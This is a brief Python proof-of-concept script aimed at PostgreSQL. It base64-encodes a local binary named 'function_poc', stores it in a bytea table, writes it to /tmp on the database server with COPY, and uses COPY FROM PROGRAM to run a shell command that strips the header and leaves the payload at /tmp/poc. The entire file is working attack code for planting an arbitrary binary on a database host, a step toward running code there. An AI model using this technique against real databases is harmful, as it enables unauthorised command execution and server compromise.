from base64 import b64encode
from contextlib import closing
import psycopg2

from util import database, exec_psql


with open('function_poc', 'rb') as fp:
    b64 = b64encode(fp.read())

with database('db'):
    exec_psql([
        """CREATE TABLE dump (t TEXT)""",
        """CREATE TABLE binaryData (b bytea)""",
        """INSERT INTO binaryData (b) values (decode('{}', 'base64'))""".format(b64),
        """COPY binaryData TO '/tmp/psql.bin' WITH BINARY""",
        """COPY dump FROM PROGRAM 'tail -c +26 /tmp/psql.bin > /tmp/poc'""",
        ], db='db')
